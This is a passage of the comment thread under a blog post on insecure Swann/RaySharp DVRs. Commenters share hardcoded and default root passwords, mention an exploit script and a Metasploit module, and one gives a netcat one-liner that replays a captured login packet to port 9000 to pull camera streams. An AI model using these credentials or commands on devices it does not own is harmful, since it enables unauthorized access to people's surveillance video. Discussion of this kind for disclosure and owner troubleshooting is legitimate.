    My goal was to gain cmd access so i can look for a static picture url for the various cameras for integration into HSTouch from HomeSeer... see the whole thread over at http://cocoontech.com/forums/topic/23488-video-surveillance-blue-iris-and-homeseerhstouch-or-ipcameras/page-2#entry189744

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=4928676376500783041)Replies
    Reply
13. ![](//resources.blogblog.com/img/blank.gif)Anonymous[March 4, 2013 at 1:47 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1362433654619#c7312346876971324613)

    Actually I have only one question — about the strange hex string with a lot of nulls that you assigned to the t1 variable. Would you be so kind to tell where do you get it from? You wrote that you merely opened 'the application user account page', but I didn't manage to find even any similar string in traffic to the 9000 port, when I tried various options of the DVR menu within the ActiveX element. The only message I spotted began with 'REMOTE HI\_SRDK\_SYS\_USERMNG\_GetUserList', but I didn't manage to receive a desired reply when I sent it directly to the port without any prelude. But your exploit worked on that device.

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=7312346876971324613)Replies
    Reply
14. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/05636573121527801930)[March 27, 2013 at 7:43 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1364438585811#c3355514955160374228)

    Oh, yeah, this vulnerability. Back in Dec 2011, I reported it to the vendor with a strong request to forward it to the OEM (which I seem to recall is Zhuhai RaySharp Technology Co., Ltd). My bug report included nicely annotated tcpdumps and everything. Here's the response I received:

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=3355514955160374228)Replies
    Reply
15. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Damo](https://www.blogger.com/profile/15163947273975815214)[April 7, 2013 at 8:28 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1365391729322#c5428256626179184192)

    See my post: http://www.damow.net/2012/12/14/digging-into-dvrs/

    I have a proof of concept that can recover passwords for another variety of these things over the network.

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=5428256626179184192)Replies
    Reply
16. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/17155378673610748159)[May 7, 2013 at 10:22 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1367947336650#c5768145223142463150)

    Hello !
    Can you give me an email address to talk to you in private please ? (someLuser)
    I've a problem with the content of your blog.
    Thanks you !

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=5768145223142463150)Replies
    Reply
17. ![](//www.blogger.com/img/blogger_logo_round_35.png)[mike](https://www.blogger.com/profile/11546893811806109777)[May 13, 2013 at 5:37 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1368491837510#c6335422404758205551)

    It seems some of the ZMODO machines have fixed some of these bugs (pre-authentication retrieval of passwords to name one). however, i am trying to boot into single user mode similar to how you did it, and noticed that it just will load the kernel and not show anything after that. do you think it could be some kind of mod they did so people cant boot into it? i was reading some translated chinese pages on google and they mentioned that it was being fixed.

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=6335422404758205551)Replies
    Reply
18. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Chris](https://www.blogger.com/profile/10588289341009210368)[May 26, 2013 at 4:39 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1369611595055#c3738789941684843544)

    so has anyone been able to get an rtsp stream outa these boxs ?

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=3738789941684843544)Replies
    Reply
19. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/04344698780741074352)[June 27, 2013 at 6:26 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1372382795375#c1491720699840198771)

    Does anyone know if on telnet to the swann DVR does it allow for browsing the file system + recordings?
    If I take the drive out and plug it in an external SATA reader the drive is not recognizable by Windows so I was wondering if telnet allows the full viewing of the OS + data stored on the drive?

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=1491720699840198771)Replies
    - ![](//www.blogger.com/img/blogger_logo_round_35.png)[Woodchuck](https://www.blogger.com/profile/01730813357056348841)[March 24, 2014 at 11:08 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1395684526308#c3136707589493607963)

      Yes, I can see the attached hard drive and video files on it, while telnetting into the router. They don't have a standard extension though.

      [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=3136707589493607963)Replies
      Reply
    - ![](//www.blogger.com/img/blogger_logo_round_35.png)[Nigel](https://www.blogger.com/profile/16570349252948836345)[November 26, 2016 at 4:01 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1480204875213#c1624564860854371186)

      Further to Woodchuck's response, don't forget that it is a Linux box, so Windows won't understand the drive unless you add something to help it.
      Boot into Linux (use a thumbdrive or whatever) and it'll see the drive normally if you mount it.

      [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=1624564860854371186)Replies
      Reply
    Reply
20. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/08477529796180996724)[June 28, 2013 at 7:43 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1372473800029#c4777530267347481250)

    I'd like to thank you for your insight and (very) blunt assessment of these DVRs. I own one, (but was lucky enough to have a "firmware" without the 1234-esque password).

    Strangely enough, I used your instructions for a 100% white-hat purpose: To change the root password so I may shut the system down cleanly via telnet in the event of a power failure.

    The not-so wonderful support folks at (company here) told me, in no uncertain terms, that telnet and SSH was not available and did not exist on their product (mind you, I was sending the question while staring at the login prompt in Putty...). All I wanted to do was shut it down. I didn't care about the method, be it Telnet, SSH, SOAP, etc...

    Using your instructions, I was able to set a new root password, and can now have my UPS-equipped server issue all the halt/poweroff/restart commands I'd like, and don't have to worry about the drive safely being unmounted in the even of a power failure.

    Now, I'm off to try to SSL Wrapper this thing to take care of the rest of its issues...

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=4777530267347481250)Replies
    Reply
21. ![](//www.blogger.com/img/blogger_logo_round_35.png)[cashmoney](https://www.blogger.com/profile/04221386220536381395)[July 7, 2013 at 12:11 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1373224266172#c8058388336332037316)

    So has anyone been able to get the direct stream link/URl off these DVR's? Or is it impossible?

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=8058388336332037316)Replies
    Reply
22. ![](//resources.blogblog.com/img/blank.gif)Anonymous[September 14, 2013 at 12:33 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1379187235588#c6708395025069278640)

    I'm not a computer expert or anything, but I have questions I hope someone here can answer. My friend has a Swann DVR system. I helped her install it. It worked fine at first, then things went south. Now when watching the playback, the video will randomly loop backwards at eerily convenient times. The playback footage has also begun to black out for 1-2 minute intervals, leaving large gaps of time unviewable. I thought the blackouts could be something up with the whole system, but it only happens to the cameras individually (and both of them do it) rather than both going down at once...so I don't think it's the camera itself, unless both are defective. After that went on for a while, the remote access to the DVR stopped working entirely. Someone had changed the port number the DVR uses which fucked with the remote access, and it definitely wasn't us. So, my question is thus: If someone were to gain access to the DVR (the people in question HAVE had physical access to the DVR box), would it be possible for them to actually modify the footage, or perhaps gain control of the cameras remotely to cause those blackouts? I just want to figure out if her system has possibly been compromised, because she is trying to gain proof of some fucked up shit with video footage and the playback is unreliable. One of the people who would be capable of doing this retired from the NSA after 20 years, so I have no doubt he would be able to pull it off if it's possible. Just unsure of what all could be done with the kind of access you describe here. Sorry this is sort of off topic, but I don't really know where else to find out what sort of manipulation is possible. Swann's tech support is pretty much useless. Thanks to anyone who can help.

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=6708395025069278640)Replies
    Reply
23. ![](//resources.blogblog.com/img/blank.gif)Anonymous[September 16, 2013 at 12:25 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1379359540627#c4370116038213615000)

    If you continue looking at the raysharp\_dvr binary, you will also find a few hardcoded passwords -- ROOT:topsecret (not kidding), rsroot:rs5678. The firmware (unpackable using firmware mod kit) also contains a couple of hashes for the root accounts, one of which is DES and resolves to root:helpme, the other is MD5 (not in dictionary, varies by DVR).

    I am deciding whether i should return this DVR or rewrite its firmware. The current firmware appears like it was written by a bunch of monkeys. Also ActiveX-only, really? Too bad because hardware seems to be solid (it is built around HiSilicon's HI35zxx ARM CPU)

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=4370116038213615000)Replies
    Reply
24. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/01649278676563901744)[October 25, 2013 at 6:11 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1382706715958#c5940931964250391565)

    Has anyone managed to view the video stream without using the supplied software please?

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=5940931964250391565)Replies
    Reply
25. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/12632034128696990384)[October 29, 2013 at 8:06 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1383059166254#c5973655198846225220)

    Is there an updated location for the dvrown.py script? I'm trying to get into my night-owl, but I cannot find the script anywhere.

    Thanks

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=5973655198846225220)Replies
    Reply
26. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Lawrence](https://www.blogger.com/profile/09020690767752146111)[December 1, 2013 at 12:03 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1385928206929#c1861735056690261236)

    As a consumer looking for a security DVR for the home, what are some brand names to look into that are NOT using the RaySharp software, and are known to have highly secure firmware.

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=1861735056690261236)Replies
    Reply
27. ![](//www.blogger.com/img/blogger_logo_round_35.png)[xnaron](https://www.blogger.com/profile/06333705945820718932)[January 26, 2014 at 11:28 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1390764504746#c3234760193895171407)

    The video stream is initiated by connecting to port 9000 and sending it 16 bytes. All the bytes appear to be zero (00) except for bytes 5 and 13. 5 is always the same 0x47 and Byte 13 is the one that selects which camera to stream. For camera number one byte 13 = 0xA4. I wrote a perl script that will listen on a port and when a client connects it will connect to the dvr, send the 16 bytes and start streaming the output to the connected client. I am unable to get vlc to connect. I wrote another script to dump the output from the stream to a file and tried to play it with vlc and it would not play. I marked it as avi and tried to play with windows media player and it did sort of play and I could see the top 1/10th of the screen. I'll need to keep playing with it. If anyone else has any info on how to play it please post.

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=3234760193895171407)Replies
    Reply
28. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/12576836879660452573)[February 19, 2014 at 6:26 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1392820008201#c5903683410657407371)

    What type of serial breakout board did you use? I could only get mine to show garbled text.

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=5903683410657407371)Replies
    - ![](//www.blogger.com/img/blogger_logo_round_35.png)[someLuser](https://www.blogger.com/profile/16124941373996159409)[February 27, 2014 at 9:55 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1393523748705#c4447473182439663553)

      FTDI breakout - https://www.sparkfun.com/products/9716

      [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=4447473182439663553)Replies
      Reply
    Reply
29. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Woodchuck](https://www.blogger.com/profile/01730813357056348841)[March 3, 2014 at 6:53 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1393901584074#c3445492069100256062)

    Not sure if the manufacturer fixed this specific vulnerability, but I noticed a firmware update hidden away on their website:

    http://swann.com/downloads/New\_FTP/Name/

    I updated my DVR8-4000 to the latest release available, then tried the python script. I had to mod the script to use my port, instead of the default 9000. The result is "No reply, not vuln." I only wish I had tried this on the original firmware before upgrading. If anyone tries the script, then updates firmware, I'd be curious to hear the before/after result.

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=3445492069100256062)Replies
    - ![](//www.blogger.com/img/blogger_logo_round_35.png)[Woodchuck](https://www.blogger.com/profile/01730813357056348841)[March 3, 2014 at 7:56 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1393905376098#c6160105171724189399)

      Oh boy. Just poking around, I telneted into the router and logged in as root with no password. Good grief. Trying to change the password to something, anything, I get "passwd: An error occurred updating the password file." Any ideas why it's doing that?

      [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=6160105171724189399)Replies
      Reply
    - ![](//www.blogger.com/img/blogger_logo_round_35.png)[Woodchuck](https://www.blogger.com/profile/01730813357056348841)[March 4, 2014 at 6:46 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1393944385334#c2814371436100041776)

      If I vi /etc/passwd, and try to save a password that way, I get a message that the file system is read-only. Any ideas on how to get a root password now? Sorry to newb up the thread. I'm a bit of a linux rookie.

      [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=2814371436100041776)Replies
      Reply
    - ![](//www.blogger.com/img/blogger_logo_round_35.png)[moneykid207](https://www.blogger.com/profile/02940273468603479056)[July 29, 2015 at 1:18 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1438201104492#c6259719644897272921)

      Hey Woodchuck, still active? Unfortunately, their website is parked and empty with only a header page.. :( Would you still happen to have the "getPass.py" file anywhere?

      [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=6259719644897272921)Replies
      Reply
    - ![](//www.blogger.com/img/blogger_logo_round_35.png)[moneykid207](https://www.blogger.com/profile/02940273468603479056)[July 29, 2015 at 1:21 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1438201302562#c3852609099881323564)

      Hey Woodchuck, still active? Unfortunately, their website is parked and empty with only a header page.. :( Would you still happen to have the "getPass.py" file anywhere?

      [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=3852609099881323564)Replies
      Reply
    - ![](//www.blogger.com/img/blogger_logo_round_35.png)[Woodchuck](https://www.blogger.com/profile/01730813357056348841)[July 29, 2015 at 8:15 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1438226108460#c6723548192680903814)

      Sry Money. I never messed with it. Nada.

      [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=6723548192680903814)Replies
      Reply
    - ![](//www.blogger.com/img/blogger_logo_round_35.png)[someLuser](https://www.blogger.com/profile/16124941373996159409)[August 10, 2015 at 1:11 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1439237484863#c441906119522138851)

      HDM turned it into an aux module for msf - https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/misc/raysharp\_dvr\_passwords.rb

      [Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=441906119522138851)Replies
      Reply
    Reply
30. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/12988379931086036718)[April 1, 2014 at 2:52 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1396345947297#c3164327039481410781)

    http://esyncsecurity.com ....Very nice info...

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=3164327039481410781)Replies
    Reply
31. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/18092618424039317838)[September 13, 2014 at 3:23 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1410603821019#c6011361335967245334)

    Arggg.........Faint... very scare to read the command, I rather hire the expert to do for me..... [DVR Cameras](http://www.iwatchs.com.my/)

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=6011361335967245334)Replies
    Reply
32. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/11011413120964835137)[September 14, 2014 at 1:59 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1410685199090#c9012732291945029455)

    [Iwatchs](http://www.iwatchs.com.my/) can give us the solution.

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=9012732291945029455)Replies
    Reply
33. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/05710086015573508082)[September 14, 2014 at 6:49 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1410745766843#c5465833383365573111)

    Thank for sharing such a informative blog, i like it so much. [Security Systems](http://iwatchs.com.my/)

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=5465833383365573111)Replies
    Reply
34. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/05577737356471177431)[December 23, 2014 at 2:16 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1419329782303#c6678859292991333980)

    could you tell me how to hack tvt dvr ?
    my email is gasinmars123456@gmail.com

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=6678859292991333980)Replies
    Reply
35. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/02539708665100786247)[January 19, 2015 at 7:34 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1421724874951#c5078271083549378328)

    This comment has been removed by the author.

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=5078271083549378328)Replies
    Reply
36. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/00985384044972828249)[April 18, 2015 at 1:03 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1429344209790#c1706778773630613104)

    can someone tell me if this gone for god
    http://pastebin.com/20NYykC9

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=1706778773630613104)Replies
    Reply
37. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unknown](https://www.blogger.com/profile/18335893092370423947)[November 24, 2015 at 6:00 AM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1448373635569#c2771963815607870098)

    Some time ago I was looking for ways how to connect to my Swann DVR over internet and skip their ActiveX component. This search got me to this page and somehow inspired to dig deeper, as I wasn't able to anything from the net. Next stop was http://www.securityfocus.com/archive/1/534830/100/800/threaded. Apparently most of cheap end DVRs are coming from the same place and have same software within. Take away from previous article for me was that network traffic what is happening between ActiveX component and DVR is not encrypted. From my school days I remembered that there is a way to look into TCP traffic going out from your computer. I got myself Wireshark and spent couple of hours reading how TCP works. Basically you just need to get tour Wiresark going and see what kind of a traffic is going from ActiveX component to DVR and what comes back. It appears that there is plain h.264 video stream coming for every channel and you can save/stream/watch it really easily. It takes just connecting to your DVR media port (9000) and sending one TCP packet per channel to initiate the stream. In Wireshark look for the package with length 561 (or 3rd packet in TCP stream flow for every camera). Copy binary format of this packet payload and that is your key in. Simple linux command that worked for me is below (this ugly looking part after echo command is the place where you want to put the payload data you copied before)

    echo '0000000000000000000001000000030f0000000000000000000068000000010000001000000001000000010000000061646d696e00000000000000010000000100e3194000446d00000000602bc21c6e6f72383474000030732a14a01e0000a8440000020000000050dc7efcb4d713000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000' | xxd -r -p | nc 192.168.1.244 9000 > cam1.h264

    This script will keep writing pure h.264 stream into the file. In case you want to have some remote viewing application built on top you probably want to create some named pipe and send stuff there. Then take ffmpeg, convert the stream into something else and do what ever you need to do with it.

    So in short, there is a way to skip ActiveX component for your Swann DVR but entire thing is one big security hole. Just close down all the DVR ports in your firewall if you have something to hide;)

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=2771963815607870098)Replies
    Reply
38. ![](//www.blogger.com/img/blogger_logo_round_35.png)[ylluminate](https://www.blogger.com/profile/17671538710327905796)[June 25, 2016 at 3:49 PM](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html?showComment=1466894962026#c634462129803591444)

    Many of the logins for such devices are `root` with `123456`, which managed to get me into telnet.

    Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5948768001255972621&postID=634462129803591444)Replies
    Reply

Add commentLoad more...

Note: Only a member of this blog may post a comment.

[Newer Post](http://console-cowboys.blogspot.com/2013/06/novell-zenworks-mdm-mobile-device.html "Newer Post")

[Older Post](http://console-cowboys.blogspot.com/2012/12/open-sesame-dlink-cve-2012-4046_27.html "Older Post")

[Home](http://console-cowboys.blogspot.com/)

Subscribe to:
[Post Comments (Atom)](http://console-cowboys.blogspot.com/feeds/6576519571275822110/comments/default)

### [Interview I did with Covert Access Team](http://console-cowboys.blogspot.com/2024/11/interview-i-did-with-covert-access-team.html)

This is an interview I did with cover access team covering things for example:  Talks about blockchain attacks Chatting about running and m...

![](https://i.ytimg.com/vi/V6O8tRfw0PE/hqdefault.jpg)

* [![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjz7IIEGAmhQtMAEtkNVLHOeo83QfPS6JP2wxYhj8PbNjOS5qQwOj5-JOzEEM2aKaXJGK0CMWxNNrH9YS_ChoyVpYX1LcNXLJpzRbQusegfWjKE3_21zIquSjeDxRuu9M-sMH8ijenf0LHR/w72-h72-p-k-no-nu/board_with_header.png)](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html)

  [Swann Song - DVR Insecurity](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html)
  "Swan song" is a metaphorical phrase for a final gesture, effort, or performance given just before death or retirement. This post ...
* [![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjf1ScpYVRwHbg8a2YDs3QMVNgBuEG2w7YkfBtxawuh_Jlpq_8XATxwWNgLtPCg9rC1a7MC8IjeUeHZcvfINGm5_0mGJg7JNV0nRZZuo9acDSTIeBD2Ea48zI2fYofIwB_AxwjkjAiAkFdw/w72-h72-p-k-no-nu/1.png)](http://console-cowboys.blogspot.com/2012/01/trendnet-cameras-i-always-feel-like.html)

  [Trendnet Cameras - I always feel like somebody's watching me.](http://console-cowboys.blogspot.com/2012/01/trendnet-cameras-i-always-feel-like.html)
   Firstly this post requires the following song to be playing. http://www.youtube.com/watch?v=wVfjwIyc-CU Now that we got that out of...
* [![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhyMbMtVo5CCxXt0ngyTir6gxRjQQBkRYymvcZYUkC6x7rkbF2E8ESfADgs79rpuFAfnC0dcDBdpRCT9eY8OhwAVbhJlrV-u4z4rQd1bgDf62MpCsxHN6WMKWCo2afQ-2uTRsUzs4UeG66c/w72-h72-p-k-no-nu/1.png)](http://console-cowboys.blogspot.com/2014/09/scaling-netscaler.html)

  [Scaling the NetScaler](http://console-cowboys.blogspot.com/2014/09/scaling-netscaler.html)
   A few months ago I noticed that Citrix provides virtual appliances to test their applications, I decided to pull down an appliance and ...

## Blog Archive

* ►
  [2024](http://console-cowboys.blogspot.com/2024/)
  (5)
  + ►
    [November](http://console-cowboys.blogspot.com/2024/11/)
    (2)
  + ►
    [October](http://console-cowboys.blogspot.com/2024/10/)
    (1)
  + ►
    [September](http://console-cowboys.blogspot.com/2024/09/)
    (1)
  + ►
    [January](http://console-cowboys.blogspot.com/2024/01/)
    (1)

* ►
  [2023](http://console-cowboys.blogspot.com/2023/)
  (4)
  + ►
    [December](http://console-cowboys.blogspot.com/2023/12/)
    (1)
  + ►
    [March](http://console-cowboys.blogspot.com/2023/03/)
    (2)
  + ►
    [February](http://console-cowboys.blogspot.com/2023/02/)
    (1)

* ►
  [2022](http://console-cowboys.blogspot.com/2022/)
  (1)
  + ►
    [August](http://console-cowboys.blogspot.com/2022/08/)
    (1)

* ►
  [2021](http://console-cowboys.blogspot.com/2021/)
  (1)
  + ►
    [March](http://console-cowboys.blogspot.com/2021/03/)
    (1)

* ►
  [2020](http://console-cowboys.blogspot.com/2020/)
  (9)
  + ►
    [October](http://console-cowboys.blogspot.com/2020/10/)
    (2)
  + ►
    [September](http://console-cowboys.blogspot.com/2020/09/)
    (3)
  + ►
    [August](http://console-cowboys.blogspot.com/2020/08/)
    (4)

* ►
  [2019](http://console-cowboys.blogspot.com/2019/)
  (3)
  + ►
    [November](http://console-cowboys.blogspot.com/2019/11/)
    (1)
  + ►
    [April](http://console-cowboys.blogspot.com/2019/04/)
    (2)

* ►
  [2018](http://console-cowboys.blogspot.com/2018/)
  (3)
  + ►
    [November](http://console-cowboys.blogspot.com/2018/11/)
    (1)
  + ►
    [April](http://console-cowboys.blogspot.com/2018/04/)
    (1)
  + ►
    [January](http://console-cowboys.blogspot.com/2018/01/)
    (1)

* ►
  [2017](http://console-cowboys.blogspot.com/2017/)
  (3)
  + ►
    [November](http://console-cowboys.blogspot.com/2017/11/)
    (1)
  + ►
    [October](http://console-cowboys.blogspot.com/2017/10/)
    (2)

* ►
  [2014](http://console-cowboys.blogspot.com/2014/)
  (3)
  + ►
    [September](http://console-cowboys.blogspot.com/2014/09/)
    (2)
  + ►
    [March](http://console-cowboys.blogspot.com/2014/03/)
    (1)

* ▼
  [2013](http://console-cowboys.blogspot.com/2013/)
  (2)
  + ►
    [June](http://console-cowboys.blogspot.com/2013/06/)
    (1)
  + ▼
    [January](http://console-cowboys.blogspot.com/2013/01/)
    (1)
    - [Swann Song - DVR Insecurity](http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html)

* ►
  [2012](http://console-cowboys.blogspot.com/2012/)
  (9)
  + ►
    [December](http://console-cowboys.blogspot.com/2012/12/)
    (1)
  + ►
    [October](http://console-cowboys.blogspot.com/2012/10/)
    (1)
  + ►
    [August](http://console-cowboys.blogspot.com/2012/08/)
    (1)
  + ►
    [July](http://console-cowboys.blogspot.com/2012/07/)
    (2)
  + ►
    [March](http://console-cowboys.blogspot.com/2012/03/)
    (1)
  + ►
    [January](http://console-cowboys.blogspot.com/2012/01/)
    (3)

* ►
  [2011](http://console-cowboys.blogspot.com/2011/)
  (12)
  + ►
    [November](http://console-cowboys.blogspot.com/2011/11/)
    (2)
  + ►
    [September](http://console-cowboys.blogspot.com/2011/09/)
    (1)
  + ►
    [June](http://console-cowboys.blogspot.com/2011/06/)
    (2)
  + ►
    [May](http://console-cowboys.blogspot.com/2011/05/)
    (1)
  + ►
    [April](http://console-cowboys.blogspot.com/2011/04/)
    (2)
  + ►
    [March](http://console-cowboys.blogspot.com/2011/03/)
    (1)
  + ►
    [February](http://console-cowboys.blogspot.com/2011/02/)
    (1)
  + ►
    [January](http://console-cowboys.blogspot.com/2011/01/)
    (2)

* ►
  [2010](http://console-cowboys.blogspot.com/2010/)
  (9)
  + ►
    [November](http://console-cowboys.blogspot.com/2010/11/)
    (1)
  + ►
    [August](http://console-cowboys.blogspot.com/2010/08/)
    (2)
  + ►
    [June](http://console-cowboys.blogspot.com/2010/06/)
    (1)
  + ►
    [May](http://console-cowboys.blogspot.com/2010/05/)
    (2)
  + ►
    [April](http://console-cowboys.blogspot.com/2010/04/)
    (1)
  + ►
    [February](http://console-cowboys.blogspot.com/2010/02/)
    (2)

| * [Home](http://console-cowboys.blogspot.com/) | Search This Blog  |  |  | | --- | --- | |
| --- | --- | --- | --- |

### [Report Abuse](https://www.blogger.com/go/report-abuse)

|  |  |
| --- | --- |

Awesome Inc. theme. Powered by [Blogger](https://www.blogger.com).


